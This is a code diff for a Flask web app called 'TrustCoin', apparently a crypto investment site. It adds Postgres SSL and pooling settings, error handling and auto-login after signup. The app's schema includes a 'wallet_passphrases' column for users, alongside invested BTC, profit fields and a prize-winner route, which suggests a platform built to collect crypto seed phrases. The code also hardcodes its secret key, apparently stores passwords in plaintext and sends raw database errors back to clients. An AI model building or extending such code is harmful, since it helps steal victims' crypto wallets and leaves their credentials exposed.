@@ -3,15 +3,28 @@ from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
 import os, random, string, secrets, io, threading, time
 from sqlalchemy import inspect, text
+from sqlalchemy.pool import NullPool
 
 app = Flask(__name__)
 app.secret_key = 'trustcoin_secret_key_2024'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
+    'pool_size': 5,
+    'pool_recycle': 3600,
+    'pool_pre_ping': True,
+    'connect_args': {'connect_timeout': 10}
+}
 
 # Database configuration
 database_url = os.environ.get('DATABASE_URL')
 if database_url:
-    app.config['SQLALCHEMY_DATABASE_URI'] = database_url.replace('postgres://', 'postgresql://', 1)
+    # Fix for Render PostgreSQL: add sslmode=require if not already present
+    if 'sslmode' not in database_url:
+        separator = '&' if '?' in database_url else '?'
+        database_url += f"{separator}sslmode=require"
+    # Replace postgres:// with postgresql://
+    database_url = database_url.replace('postgres://', 'postgresql://', 1)
+    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
 else:
     app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///trustcoin.db'
 
@@ -19,7 +32,7 @@ db = SQLAlchemy(app)
 
 # ---------- Models ----------
 class User(db.Model):
-    __tablename__ = 'users'  # <-- FIXED: avoid reserved keyword 'user'
+    __tablename__ = 'users'
     id = db.Column(db.Integer, primary_key=True)
     legal_name = db.Column(db.String(120), nullable=False)
     dob = db.Column(db.String(20), nullable=False)
@@ -42,7 +55,7 @@ class User(db.Model):
 class Transaction(db.Model):
     __tablename__ = 'transactions'
     id = db.Column(db.Integer, primary_key=True)
-    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)  # <-- updated foreign key
+    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
     tx_type = db.Column(db.String(30), nullable=False)
     amount = db.Column(db.Float, nullable=False)
     status = db.Column(db.String(30), default='Pending')
@@ -84,29 +97,31 @@ class ContactMessage(db.Model):
 
 # ---------- Auto-migration ----------
 def ensure_columns():
-    inspector = inspect(db.engine)
-    # Check users table (renamed from 'user')
-    user_columns = [col['name'] for col in inspector.get_columns('users')]
-    with db.engine.connect() as conn:
-        if 'invested_btc' not in user_columns:
-            conn.execute(text('ALTER TABLE users ADD COLUMN invested_btc VARCHAR(10) DEFAULT "0"'))
-        if 'wallet_passphrases' not in user_columns:
-            conn.execute(text('ALTER TABLE users ADD COLUMN wallet_passphrases TEXT'))
-        if 'total_profit' not in user_columns:
-            conn.execute(text('ALTER TABLE users ADD COLUMN total_profit FLOAT DEFAULT 0.0'))
-        if 'btc_balance' not in user_columns:
-            conn.execute(text('ALTER TABLE users ADD COLUMN btc_balance FLOAT DEFAULT 0.0'))
-        conn.commit()
-    # Check transactions table
     try:
-        trans_columns = [col['name'] for col in inspector.get_columns('transactions')]
+        inspector = inspect(db.engine)
+        # Check users table
+        user_columns = [col['name'] for col in inspector.get_columns('users')]
         with db.engine.connect() as conn:
-            if 'updated_at' not in trans_columns:
-                conn.execute(text('ALTER TABLE transactions ADD COLUMN updated_at DATETIME'))
-                conn.commit()
-    except Exception:
-        pass
-    db.create_all()
+            if 'invested_btc' not in user_columns:
+                conn.execute(text('ALTER TABLE users ADD COLUMN invested_btc VARCHAR(10) DEFAULT "0"'))
+            if 'wallet_passphrases' not in user_columns:
+                conn.execute(text('ALTER TABLE users ADD COLUMN wallet_passphrases TEXT'))
+            if 'total_profit' not in user_columns:
+                conn.execute(text('ALTER TABLE users ADD COLUMN total_profit FLOAT DEFAULT 0.0'))
+            if 'btc_balance' not in user_columns:
+                conn.execute(text('ALTER TABLE users ADD COLUMN btc_balance FLOAT DEFAULT 0.0'))
+            conn.commit()
+        # Check transactions table
+        try:
+            trans_columns = [col['name'] for col in inspector.get_columns('transactions')]
+            with db.engine.connect() as conn:
+                if 'updated_at' not in trans_columns:
+                    conn.execute(text('ALTER TABLE transactions ADD COLUMN updated_at DATETIME'))
+                    conn.commit()
+        except Exception:
+            pass
+    except Exception as e:
+        print(f"Warning: ensure_columns failed: {e}")
 
 # ---------- Helpers ----------
 def generate_verify_code():
@@ -189,20 +204,28 @@ def verify_robot():
                 s1 = session.pop('signup_step1')
                 s2 = session.pop('signup_step2')
                 session.pop('verify_code', None)
-                new_user = User(
-                    legal_name=s1['legal_name'],
-                    dob=s1['dob'],
-                    email=s1['email'],
-                    country=s1['country'],
-                    employment=s1['employment'],
-                    invested_btc=s1['invested_btc'],
-                    income_source=s1['income_source'],
-                    username=s2['username'],
-                    password=s2['password'],
-                )
-                db.session.add(new_user)
-                db.session.commit()
-                return jsonify({'success': True})
+                try:
+                    new_user = User(
+                        legal_name=s1['legal_name'],
+                        dob=s1['dob'],
+                        email=s1['email'],
+                        country=s1['country'],
+                        employment=s1['employment'],
+                        invested_btc=s1['invested_btc'],
+                        income_source=s1['income_source'],
+                        username=s2['username'],
+                        password=s2['password'],
+                    )
+                    db.session.add(new_user)
+                    db.session.commit()
+                    # Auto-login after registration
+                    session['user_id'] = new_user.id
+                    session['username'] = new_user.username
+                    session['approved'] = new_user.approved
+                    return jsonify({'success': True})
+                except Exception as e:
+                    db.session.rollback()
+                    return jsonify({'success': False, 'error': f'Database error: {str(e)}'})
             else:
                 return jsonify({'success': False, 'error': 'INVALID_CODE'})
     return render_template('verify_robot.html')
@@ -232,6 +255,9 @@ def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('login'))
     user = User.query.get(session['user_id'])
+    if not user:
+        session.clear()
+        return redirect(url_for('login'))
     today = datetime.utcnow().date()
     active_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=False).all()
     today_profit = 0.0
@@ -382,8 +408,6 @@ def submit_winner():
     if not user:
         return jsonify({'success': False, 'error': 'User not found'})
     winner = Winner(user_id=user.id, prize=prize, category=category)
-    if hasattr(winner, 'email'):
-        winner.email = email
     db.session.add(winner)
     db.session.commit()
     return jsonify({'success': True})
